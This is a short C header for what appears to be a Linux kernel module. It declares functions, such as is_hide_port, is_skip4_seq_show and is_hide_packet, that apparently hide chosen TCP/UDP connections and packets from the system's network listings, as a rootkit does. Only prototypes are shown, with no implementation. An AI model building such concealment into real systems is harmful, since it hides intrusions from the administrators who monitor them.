
#ifndef NET_H
#define NET_H

#include "../../hook_functions.h"
extern int debug_lvl;

enum Protocols {
    tcp,
    udp
};

enum IP_type {
    ipv4,
    ipv6
};

bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol);
bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol);
bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
bool is_skip4_seq_show (void *v, enum Protocols protocol);
bool is_skip6_seq_show (void *v, enum Protocols protocol);
bool is_hide_packet(struct sk_buff *skb);

#endif
